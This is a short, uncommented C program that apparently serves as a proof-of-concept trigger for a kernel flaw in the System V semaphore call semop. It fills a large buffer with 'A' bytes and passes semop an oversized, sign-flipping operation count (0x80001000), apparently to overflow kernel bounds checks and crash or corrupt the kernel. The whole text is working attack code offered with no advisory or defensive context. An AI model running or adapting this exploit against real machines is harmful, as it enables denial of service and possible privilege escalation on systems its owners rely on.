#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
//struct sembuf sops[100];
char sops[80000];
int
main()
{
long semid, nsops;
if((semid = semget(IPC_PRIVATE, 32, IPC_CREAT|IPC_R|IPC_W|IPC_M)) < 0){
perror("semget");
return 0;
}
memset(sops, 0x41, 80000);
nsops = 0x80001000;
if(semop(semid, (struct sembuf*) sops, (int) nsops) < 0){
perror("semop");
return 0;
}
}
